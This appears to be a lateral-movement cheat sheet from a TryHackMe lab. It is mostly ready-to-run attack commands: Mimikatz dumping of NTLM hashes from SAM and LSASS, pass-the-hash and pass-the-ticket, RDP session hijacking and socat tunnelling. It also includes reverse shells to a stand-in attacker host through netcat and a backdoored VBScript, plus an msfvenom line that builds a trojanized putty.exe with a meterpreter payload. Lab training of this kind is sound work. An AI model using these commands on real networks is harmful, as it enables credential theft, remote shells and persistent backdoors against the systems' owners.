## 📡 Remote Execution Prerequisites

PsExec requires specific network and permission configurations for successful execution.
* Ports: 445/TCP (SMB)
* Required Group Memberships: Administrators

Remote Process Creation Using WMI requires similar elevated access and remote management ports.
* Ports: 135/TCP, 49152-65535/TCP (DCERPC), 5985/TCP (WinRM HTTP), 5986/TCP (WinRM HTTPS)
* Required Group Memberships: Administrators

## 🔑 Credential Extraction

Extracting NTLM hashes from the local SAM only yields hashes for local machine users. Domain user hashes are unavailable via this method.

```powershell
# Extract NTLM hashes from local SAM
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```
* Tool: Mimikatz

Extracting NTLM hashes from LSASS memory yields NTLM hashes for local users and any domain user recently authenticated on the host.

```powershell
# Extract NTLM hashes from LSASS memory
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::msv
```
* Tool: Mimikatz

## 🛡️ Authentication Manipulation



NTLM Authentication (Pass-the-Hash) executes a process as a target user utilizing their NTLM hash.

```powershell
# Execute Pass-the-Hash
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```
* Tool: Mimikatz

Kerberos Authentication (Pass-the-Ticket) injects extracted Kerberos tickets into the current session.

```powershell
# Export and inject Kerberos tickets
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```
* Tool: Mimikatz

```cmd
# Verify cached Kerberos tickets
klist
```
* Tool: Windows Command Prompt

## 🗂️ Writable Share Abuse

A common lateral movement tactic involves modifying shortcuts, scripts, or executables hosted on accessible network shares.

```vbscript
# Backdoor .vbs script execution
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```
* Tool: Windows Script Host (WSH)

```bash
# Generate backdoored executable payload
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```
* Tool: MSFVenom

## 🖥️ RDP Hijacking

Hijacking allows an operator to take over an existing remote desktop session. Note: Windows Server 2019 restricts connecting to another user's session without their password.

```cmd
# Escalate to SYSTEM and hijack RDP session
PsExec64.exe -s cmd.exe
query user
tscon 3 /dest:rdp-tcp#6
```
* Tool: PsExec / Windows Command Prompt

## 🚇 Port Forwarding and Tunnelling



Traffic routing techniques allow access to segmented network services. Standard methods include SSH Remote Port Forwarding, SSH Local Port Forwarding, and Dynamic Port Forwarding (SOCKS).

```bash
# Port forwarding using socat
socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
```
* Tool: Socat
